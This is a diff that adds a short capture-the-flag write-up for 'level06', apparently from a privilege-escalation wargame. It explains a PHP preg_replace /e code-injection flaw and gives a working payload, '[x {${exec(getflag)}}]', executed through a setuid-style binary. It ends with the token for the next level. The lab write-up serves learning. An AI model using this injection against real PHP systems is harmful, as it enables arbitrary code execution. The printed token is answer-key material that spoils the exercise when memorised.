@@ -1,0 +1,20 @@
+# Explanations of steps for level06
+
+We can see a php and an binary file with flag06 rights.
+After some test we can see both do the same things
+	./level06 level06.php
+	php level06.php level06.php
+
+Same result So let analyze it. We can see the 1st argument is open like a file and pass it to the \e regex.
+the \e regex eval any parameter given and the regex accept "[x $string]"
+and all this one is passed to the \e regex So we can execute some code into.
+
+let make the exec command in a script readed by the program
+we can do an eval with ${} so put an eval "exec" into the eval \e
+the command {${exec()}} can exec any command. so let pass it after the "[x " in regex and exec getflag
+	echo '[x {${exec(getflag)}}]' > /tmp/level06
+
+the binary have flag06 rights so let execute it eith the file just created
+	./level06 /tmp/level06
+
+Token for level07 is: "wiok45aaoguiboiki2tuin6ub"
